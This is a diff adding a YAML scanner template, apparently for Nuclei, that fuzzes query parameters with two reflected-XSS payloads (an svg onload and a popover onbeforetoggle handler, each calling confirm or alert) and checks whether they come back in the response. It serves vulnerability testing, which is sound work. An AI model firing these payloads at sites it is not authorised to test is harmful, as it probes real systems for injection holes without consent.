@@ -1,0 +1,31 @@
+id: Reflected-XSS
+info:
+  name: Basic Reflection Potential XSS Detection
+  author: h0tak88r
+  severity: medium
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    payloads:
+      reflection:
+        - '<svg onx=() onload=(confirm)(88)>'
+        - '"><button popovertarget=x>Click me</button><input type="hidden" value="y" popover id=x onbeforetoggle=alert(88)>'
+    stop-at-first-match: true
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+      - type: word
+        part: header
+        words:
+          - "text/html"
+          - "application/json"
